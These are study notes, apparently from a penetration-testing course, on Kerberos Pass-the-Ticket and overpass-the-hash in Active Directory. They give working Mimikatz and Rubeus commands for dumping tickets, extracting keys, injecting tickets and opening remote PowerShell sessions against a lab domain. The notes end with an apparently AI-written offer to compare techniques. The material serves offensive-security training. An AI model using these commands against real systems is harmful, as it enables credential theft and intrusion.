

## Overview

- PtT = lateral movement technique in Active Directory.
    
- Uses **stolen Kerberos tickets** for authentication instead of NTLM hashes.
    

---

## Kerberos Refresher

- **TGT (Ticket Granting Ticket):** request TGS.
    
- **TGS (Ticket Granting Service):** access to a specific service.
    

**Flow:**

1. User → encrypts timestamp with password hash.
    
2. DC (KDC) → validates, returns TGT.
    
3. User requests TGS with TGT.
    
4. TGS used for service authentication.
    

---

## Scenario

- Attacker gains **admin access** on compromised Windows machine.
    
- Use **Mimikatz / Rubeus** to harvest and inject Kerberos tickets.
    

---

## Harvesting Tickets

### Mimikatz

```
privilege::debug
sekurlsa::tickets /export
```

- Exports `.kirbi` files.
    
- `$` = computer account, `krbtgt` = TGT.
    

### Rubeus

```
Rubeus.exe dump /nowrap
```

- Dumps tickets in Base64.
    
- Works where Mimikatz exports fail.
    

---

## Extracting Keys

Mimikatz:

```
sekurlsa::ekeys
```

Outputs Kerberos keys:

- `aes256_hmac`
    
- `rc4_hmac_nt`
    

---

## OverPass the Hash (Pass the Key)

### Mimikatz

```
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:<hash>
```

### Rubeus

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<key> /ptt
```

- `/ptt` → injects ticket into session.
    

---

## Pass the Ticket (PtT)

### With Rubeus

1. Request + Inject:
    
    ```
    Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<hash> /ptt
    ```
    
2. Import `.kirbi`:
    
    ```
    Rubeus.exe ptt /ticket:<filename>.kirbi
    ```
    
3. Import Base64 ticket:
    
    ```
    Rubeus.exe ptt /ticket:<base64_ticket>
    ```
    
    Convert `.kirbi` → Base64:
    
    ```
    [Convert]::ToBase64String([IO.File]::ReadAllBytes("<file>.kirbi"))
    ```
    

### With Mimikatz

```
kerberos::ptt "<file>.kirbi"
```

New session:

```
misc::cmd
```

---

## PowerShell Remoting + PtT

### Requirements

- User must be **Admin** or in **Remote Management Users**.
    
- WinRM enabled (TCP 5985 / 5986).
    

### Flow with Mimikatz

```
kerberos::ptt "<ticket>"
powershell
Enter-PSSession -ComputerName <target>
```

### Flow with Rubeus

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<key> /ptt
```

→ Then launch PowerShell session.

---

Do you want me to also build a **side-by-side comparison** of PtH vs PtT (tools, commands, use cases) so you can quickly decide which technique to apply?